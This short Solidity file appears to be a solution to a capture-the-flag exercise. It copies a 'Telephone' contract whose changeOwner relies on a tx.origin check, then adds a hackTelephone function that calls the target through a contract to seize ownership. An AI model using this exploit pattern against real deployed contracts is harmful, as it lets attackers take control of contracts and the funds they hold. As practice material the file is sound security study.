// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
    Telephone telephone; //SOL
    address public owner;

    constructor(Telephone _telephone) public {
        owner = msg.sender;
        telephone = _telephone; //SOL
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }

    // SOL
    function hackTelephone() public {
        telephone.changeOwner(msg.sender);
    }
}
